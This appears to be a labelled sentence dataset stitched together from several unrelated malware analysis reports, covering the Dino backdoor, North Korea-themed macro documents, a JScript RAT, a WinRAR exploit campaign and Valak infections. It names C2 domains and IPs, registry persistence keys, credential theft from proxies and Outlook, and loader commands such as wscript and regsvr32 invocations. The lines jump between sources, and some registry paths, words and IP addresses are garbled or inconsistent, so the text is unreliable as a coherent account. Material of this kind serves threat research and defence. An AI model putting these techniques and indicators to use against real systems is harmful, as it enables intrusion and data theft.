1	The malware obtains current user preferences from HKCUSOFTWAREMicrosoftWindowsCurrentVersionInternet Settings registry key using values ProxyEnable, User Agent, ProxyServer.
1	It also tries to fetch current proxy preferences from Firefox settings by parsing %APPDATA%MozillaFireFoxProfilesprefs.js file and extracting the following values:
1	According to decrypted hardcoded data, current samples C&C is located at sureshreddy1.dns05.com, on port 443 (HTTPs).
1	In case of local Proxy Server response HTTP 407 (Authorization Required) it checks Windows Protected Storage in order to fetch stored password for current proxy.
1	For communication with C&C the malware uses custom protocol and simple incremental single byte XOR encryption.
1	Communication starts from a handshake which consists of 8 random bytes sent to the server and 8 bytes in response.
1	In case of proxy it establishes connection via HTTP CONNECT method.
1	If authorization is required the malware uses obtained login and password for current proxy and attempts to do Basic proxy authentication.
1	Next, the malware waits for a response from the server (using TCP connection in Keep Alive mode).
1	Simply run updater.exe from current directory.
1	Remove the alg entry from HKCUSOFTWAREMicrosoftWindowsCurrentVersionRun.
1	Creates a new thread and connects to the C&C in a separate session, following same procedure described above.
1	Copies %WINDIR%system32cmd.exe to %WINDIR%alg.exe and starts a new process from any of the mentioned paths.
1	The attacker can interactively work with cmd.exe, everything he types is encrypted and sent to the malware via C&C server, everything cmd.exe outputs is encrypted and instantly sent to the C&C.
1	Creates a new thread which establishes additional connection with the C&C and provides own set of operations which include: Get directory listing, Move files, Download file from attackers system to local system, Upload file from attackers system to local system, Execute application file, Delete file
1	This command is used to change value in cf file and alter delay between connections to the C&C.
1	The command-and-control server name resolves to 123.120.111.163, which is in China:
1	At the start time of writing, the C&C at 123.120.11.163 server didnt not answer to connection attempts on port 443, however the next day when we still were working on this report the domain resolution changed to 123.120.110.126 (same ISP), which is alive and responds on port 443.
1	Today, DOC (Word) documents containing North Korea related materials collected by ASEC analysis team will partially be introduced.
1	Upon opening, it connects to External URL and download additional document files via code written within XML.
1	Inside the document, there exists the following XML file inside to download and connect additional malicious macro word document via External.
1	The document file downloaded from hxxp://www.inonix.co.kr/kor/board/widgets/mcontent/skins/tmp?q=6 that attempts to connect to the target is also a word document and contains a malicious macro.
1	The macro code is obfuscated as shown below and when it is run, the code creates a malicious xml inside the template folder where basic office users template files are located and runs it.
1	Command: wscript.exe //e:vbscript //b C:\Users\[user name]\AppData\Roaming\Microsoft\Templates\1589989024.xml
1	As shown in the figure above, the created xml file attempts to access to the additional malicious network address.
1	Summary on C2 in the two documents are shown below, and it is assumed that their goal is to additionally download malware and run it.
1	[Document 2] also has a malicious macro word document of intermediate stage.
1	[Document 1] Filename: Questionnaire.docx Download address for additional DOC word file after connecting to XML External: hxxp://www.inonix.co.kr/kor/board/widgets/mcontent/skins/tmp?q=6 Additional access address for XML created from document above:hxxp://heritage2020.cafe24.com/skin/board/gallery/log/list.php?query=1
1	[Document 2] Filename: Business Report.docx Download address for additional DOC word file after connecting to XML External:hxxp://koreacit.co.kr/skin/new/basic/update/temp?q=6 Additional access address for XML created from document above:hxxp://koreacit.co.kr/skin/new/basic/update/list.php?query=1
1	The first is a JScript Remote Access Trojan (RAT) that ensures persistence on the target system and then uses encoded network connection to connect to the attacker.
1	After that, the attacker can execute arbitrary commands on the target machine to have potentially full control of it.
1	The second is an AutoIT downloader that uses network connection and script functions to download and execute malware, which could be used to infect targeted systems with malware such as ransomware, spyware and so on.
1	We observed the c.js JScript RAT downloaded from the assurancetemporaireenligne[.]com domain on April 18.
1	The PowerShell command used by the exploit of the CVE-2019-0752 vulnerability can be found in Figure 1.
1	Command used to download and launch the JScript RAT sample.
1	Deobfuscated c.js script, part one.
1	Figure 3 shows that the code stored in data1 is put in the HKCU\Software\loaderName register key and the code stored in data2 is encoded using the EncodeScriptFile function and written into the loader.jse file.
1	The path to the loader.jse script is then passed to the HKCU\Software\Microsoft\Windows\CurrentVersion\Run register key and never used again after that (we will give more details about this behavior in the next section).
1	There is also a host variable initialized with the hxxp://seemee[.]ddns[.]net/loader/loader2/www URL.
1	Finally, the loader.jse is run and c.js deletes itself.
1	Deobfuscated c.js script, part two.
1	First, the c.js script creates and sets a new value for the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
1	The Run key causes programs to run each time that a user logs on, and so the loader.jse script, which is not created yet, will run automatically each time the Windows OS boots.
1	The next step of the persistence process of the c.js script is demonstrated in Figure 5, where the script creates the actual loader.jse file.
1	Figure 5 also shows that the loader.jse script is created in the AppData folder.
1	After the creation of the loader.jse file, the c.js script uses the open handle of this file, as shown in Figure 6, to put some code in it, as shown in Figure 7.
1	Thanks to the magic bytes #@~^ present at the beginning of the file, we can conclude that the loader.jse script has been encoded with Microsoft's script encoding.
1	Then, the encoded file is run via the ShellExecute function (Figure 8) and the c.js file deletes itself.
1	To do that, it uses the Windows registry key Run, and then it drops an encoded file, loader.jse, in a hidden folder before deleting itself.
1	Connection to the Remote Server
1	Before we can analyze the behavior of the loader.jse and the connection to the remote server, we have to go back to the c.js file execution.
1	Indeed, as we saw during our static analysis, this file also creates a registry key named HKCU\Software\loaderName and sets a value data in this key with some packed JScript code.
1	API Hook on RegSetValueExA during c.js file execution.
1	This step in the c.js execution is very important because when the loader.jse is run, it opens the registry key HKCU\Software\loaderName (Figure 10) and runs the code contained in the data value.
1	API Hook on RegOpenKeyExA during loader.jse file execution.
1	After the code unpacking, Figure 12 shows that a GET request is made to the loader.php page of the hxxp://seemee[.]ddns [.]net domain.
1	Another function with the ability to decode strings is used here to decode the response of the GET request.
1	The connection with the remote server is now set up, and so the malicious script will use the code received in the response to the GET request to connect to the cmd.php page, which is the panel where the attacker can choose commands to execute on the target machine.
1	Unpacked code executed by loader.jse.
1	The script contained in the requests response is an infinite loop that makes requests to the cmd.php page to retrieve indications of the tasks to execute (Figure 13).
1	The attacker can perform multiple tasks on the target system: execute commands, download files, reboot the Windows OS, terminate the current task and shut down the Windows OS (Figure 14).
1	Commands that can be executed on the target machine.
1	Shortly after the discovery of the JScript RAT, on April 30, 2020, we observed the 2.exe file downloaded from the dark[.]crypterfile[.]com domain using the same vulnerability CVE-2019-0752 (Figure 15).
1	Command used to download and launch the AutoIT downloader sample.
1	When Dino restarts, the module is deserialized from the file and loaded into memory.
1	Funnily enough, the key serving to encrypt the file on disk is PsmIsANiceM0du1eWith0SugarInside.
1	Dinos configuration is initially stored in a serialized DataStore object contained in a zip archive at the end of the Dino binary.
1	The three last keys are displayed with obfuscated names (xT0rvwz, tr4qa589 and jopcft4T) and store parameters for the custom file system we will describe later.
1	At runtime this object is deserialized and stored inside the CORE module.
1	Uninstall Dino using the custom file system (see ramFS description below for details)
1	Execute Windows batch command passed as a parameter
1	hange the current work directory
1	Retrieve the current work directory path
1	List files in a given directory with various additional information
1	Set or remove environment variables stored in the ENVVAR module
1	Display or update module content
1	Search for files whose names match given patterns.
1	The files found are packed in an archive, which is then scheduled for upload to the C&C using the FMGR module.
1	Create an archive from given file paths
1	Unpack an archive to a given location
1	Schedule a file transfer to the C&C using the FMGR module
1	Remove the next file transfer scheduled in the FMGR module
1	Remove all scheduled file transfers in the FMGR module
1	Schedule a command to be executed at a certain time by the CRONTAB module (see CRONTAB description below for details)
1	List registered entries in the CRONTAB module
1	Remove an entry in the CRONTAB module
1	Schedule a wake-up of the malware after a certain amount of time using the CRONTAB module
1	Display the public IP of the infected machine
1	Display information about the currently used C&C server
1	Display information about all known C&C servers
1	Download a file from the currently used C&C server onto the machine
1	Delay the de-installation of the malware, if scheduled
1	At startup Dino executes successively the commands stored in the InitialCommands field in its configuration; in the sample we analyzed they are:
1	Their execution is managed by the CMDEXEC module, the commands being stored in a queue inside the CMDEXECQ module.
1	The result is reported to the C&C server.
1	RamFS content is initially stored encrypted in Dinos configuration under the key xT0rvwz, whereas the corresponding RC4 key is stored under the key tr4qa589.
1	Once the file system has been decrypted, it is stored in memory as a linked list of 512-byte memory chunks, each one of them being individually RC4-encrypted.
1	When looking for a file in ramFS, each chunk is decrypted, processed and then re-encrypted.
1	Once decrypted, file content is manipulated as chunks of 540 bytes
1	Change the current work directory on the real file system
1	Installation or de-installation of Dino, in Windows registry and/or as a service
1	Extracts a file stored in ramFS onto the machine
1	Deletes a file stored on the machine
1	Executes a file stored in ramFS
1	Injects a file stored in ramFS into a running process
1	Sleeps for a given amount of time
1	Terminates a running process
1	Usage of ramFS in Dino
1	In the case of Dino, ramFS serves as protected storage for one specific file containing the instructions to remove the malware from the machine.
1	The developers named this file the cleaner and it is executed when Dino receives the command killBD (the BD acronym is the developers designation of the malware).
1	First, it retrieves the name of the file from Dinos configuration (a.ini), then it retrieves the key to decrypt ramFS, and it finally mounts the file system in memory in order to execute the cleaner file stored inside.
1	The cleaner file contains the string INSTALL -A wusvcd -U which, once executed, will uninstall the malware from the machine  wusvcd being the name used to register Dino on the machine.
1	The commands cronadd, cronlist and crondel serve respectively to add, list, and remove scheduled tasks registered in the CRONTAB module.
1	Finally, the Visibility field defines whether the command execution will be reported to the C&C (the other possible value being Silent).
1	A very similar check (against klavme, myapp, TESTAPP and afyjevmv.exe) is present in Bunny samples, and in some first-stage implants deployed by Animal Farm.
1	Unacev2.dll vulnerability PoC
1	The exploit drops three files on the file system.
1	First, the shortcut called Goggle Chrome.lnk is placed on the users desktop.
1	Next, the same shortcut is placed in the Startup folder at %AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Goggle Chrome.lnk.
1	The files in the startup folder will be executed once the user logs into the system.
1	And finally, the executable file called win.exe is placed in the users directory at %userprofile%\win.exe.
1	The file, dropped to the user folder, is a password-protected self-extracting RAR archive.
1	When the SFX archive is created, the compilation date is set close to the timestamp of the corresponding version of the WinRAR software used.
1	Additionally, the malicious self-extracting archive contains a fake digital signature of a legitimate Microsoft tool - SysInternals Autoruns.
1	Once we have a password, we can check the internals of the win.exe file.
1	As can be seen in figure 15, it contains another executable file called winlog.exe.
1	Besides that, it has an embedded SFX script that is executed when the archive data is extracted:
1	This time, searching for the copyright, versions, and script we found a custom tool called Modified 7-Zip SFX module for installers, version 1.6.1 Stable build 3873 was used to create the malicious file.
1	The custom software produces a 7zip SFX archive with exactly the same timestamp as the malicious file.
1	The first one is called 5532.cmd, and it is a command prompt (batch) file.
1	The second file is an executable and is called config.exe.
1	It has a hardcoded C2 server, filename, and user-agent:
1	First, the malware extracts its proxy information from the registry key.
1	HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings.
1	It then saves the following information: ProxyServer (Proxy server address), ProxyUser (Proxy username), ProxyPass (Proxy password)
1	Next, it gets the name of the computer and generates a unique ID.
1	Once done, it calls the systeminfo utility and saves the whole output to a text file that in our case called ohJlkad.txt:
1	Initial data collection code
1	After that, it waits for 40 seconds using the command:
1	Once the timer ends, it will check for the internet connection by launching a ping command and sending 14 requests to google.com
1	ping n 14 google.com
1	Once finished, it kills the task with the filename stated in the configuration (librelogout.exe) and deletes the file.
1	Finally, it calls the config.exe application to provide several arguments:
1	In case the user is connected to the internet via proxy, it will provide additional arguments to config.exe:
1	In this case, the initial file mirotvorec.rar contains an exploit for the WinRAR unacev2 module.
1	After the config.exe returns, the script launches the main payload hosted on C2.
1	Collects information about the infected host
1	Sends it to the C2 via config.exe
1	Downloads and launches the main payload
1	Analyzing the config.exe file, we found out that it is a legit wget version (v 1.11.4) with OpenSSL support compiled for Windows
1	Another fact is that the .lnk shortcuts help simplify the forensic analysis of malicious campaigns by providing the amount of the information hidden from the user.
1	Another artifact left by the attackers is the password they used to unpack win.exe.
1	For a Windows computer to become infected, a victim must:
1	Open malspam with password-protected ZIP attachment.
1	Extract Microsoft Word document from the password-protected ZIP archive using a unique password from the message text.
1	Open the Word document as shown below in Figure 2 and enable macros.
1	An HTTP or HTTPS URL ending with .cab that returned a DLL to install Valak.
1	Valak DLL was saved to the C:\ProgramData\ directory using a random file name, usually with a .dat or .jpg file extension, as shown in Figure 3.
1	Valak DLL was run using regsvr32.exe -s [filename]
1	Popup message stating the DLL was successfully run, as shown in Figure 4.
1	A JavaScript configuration file appeared as a random file name (always the same name for each wave of infections) under the C:\Users\Public\ directory, as shown in Figures 5 and 6.
1	Initial HTTP command and control (C2) traffic returned encoded ASCII text used to create additional malware/artifacts for the infection.
1	Initial Valak DLL retrieved after enabling macros on the Word document from Figure 2.
1	Pop-up message on a Windows 10 host when an initial Valak DLL was successfully run using RegSvr32.exe after macros were enabled on June 24, 2020.
1	Initial script file in C:\Users\Public\ directory used during Valak infection from June 24, 2020.
1	A Windows executable (EXE) appeared in the infected user's AppData\Local\Temp directory as a random file name ending in .bin (PE32 executable, Mono/.Net assembly), as shown in Figure 7.
1	Windows registry entries were created under the key for HKCU\SOFTWARE\ApplicationContainer\Appsw64
1	A randomly-named text file and JavaScript (JS) file both appeared under the C:\Users\Public\ directory, as shown in Figures 8, 9 and 10.
1	A scheduled task was created to run the JS file located under C:\Users\Public\ and repeat running it every four minutes, as shown in Figure 11.
1	EXE file with a .bin file extension from the June 24, 2020, Valak infection.
1	Additional artifacts in the C:\Users\Public\ directory created during the infection.
1	Valak C2 traffic returned encoded ASCII text used to create a follow-up malware EXE.
1	The follow-up malware EXE was appended to the randomly-named text file in C:\Users\Public using ADS, as shown in Figure 12.
1	A scheduled task was created to run the follow-up malware EXE once, shortly after it was created, as shown in Figure 13.
1	Text file in C:\Users\Public\ directory updated with ADS.
1	Scheduled task to run the follow-up malware.
1	The infection starts when a victim enables macros on one of the malicious documents.
1	This usually generates a URL ending with .cab that returns a Windows DLL file.
1	Figure 14 shows a Valak infection from June 24, 2020, filtered in Wireshark to list the HTTP requests and other web-based traffic.
1	The first line shows a URL that ends with .cab.
1	A TCP stream of this activity is shown in Figure 15, and it reveals signs of an EXE or DLL file returned from the server.
1	TCP stream for the HTTP GET request ending in .cab that returned a Windows DLL file.
1	Checking the binary in VirusTotal shows this file is a DLL.
1	The HTTP requests are Valak C2 traffic, which is sent to decoy domains (non-malicious domains from legitimate organizations) and malicious domains.
1	Valak C2 traffic returns data as encoded ASCII text that is decoded on the victim host and saved as malware items like script files, EXE used during the infection and data for registry updates for the Valak infection.
1	Valak C2 over HTTP traffic returning ASCII data used to create malware items on the victim host.
1	In addition to HTTP GET requests, Valak uses HTTP POST requests to exfiltrate certain types of data.
1	In Figures 17 and 18, we see an HTTP POST request starting with class4.aspx?internalService= that sends login credentials used for Microsoft Outlook from an infected Windows host.
1	Valak infection traffic filtered in Wireshark showing an HTTP POST request from the C2 traffic.
1	TCP stream of the HTTP POST request showing a base64 string containing Outlook login credentials of the infected host.
1	Malspam spoofs legitimate email chains based on mailbox data retrieved from previously-infected Windows hosts.
1	It sends copies of these email chains to senders and recipients from the original email chain.
1	The spoofed email chain includes a short message as the most recent item in the chain.
1	This item is a generic message that instructs recipients to open an attached ZIP archive using a supplied password.
1	The password-protected ZIP attachments contain a Microsoft Word document with macros to install malware.
1	The macros usually generate a URL ending in .cab to retrieve a binary that installs malware.
1	To get an idea of traffic patterns associated with Shathak/TA551, recent examples of URLs generated by the associated Word macros follow (Read: Date - URL).